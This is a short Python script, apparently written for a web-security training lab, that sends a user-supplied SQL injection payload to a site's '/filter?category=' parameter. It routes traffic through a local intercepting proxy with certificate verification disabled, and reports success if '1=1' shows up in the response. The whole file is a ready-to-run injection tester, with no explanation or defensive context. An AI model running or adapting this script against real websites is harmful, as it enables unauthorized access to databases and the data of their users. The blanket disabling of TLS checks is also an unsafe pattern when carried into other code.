import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "1=1" in r.text:
        return True
    else:
        return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
        print(f'[-] Example: {sys.argv[0]} www.example.com <payload>')
        sys.exit(-1)
    
    if exploit_sqli(url, payload):
        print("[+] SQLi successful")
    else:
        print("[+] SQLi unsuccessful")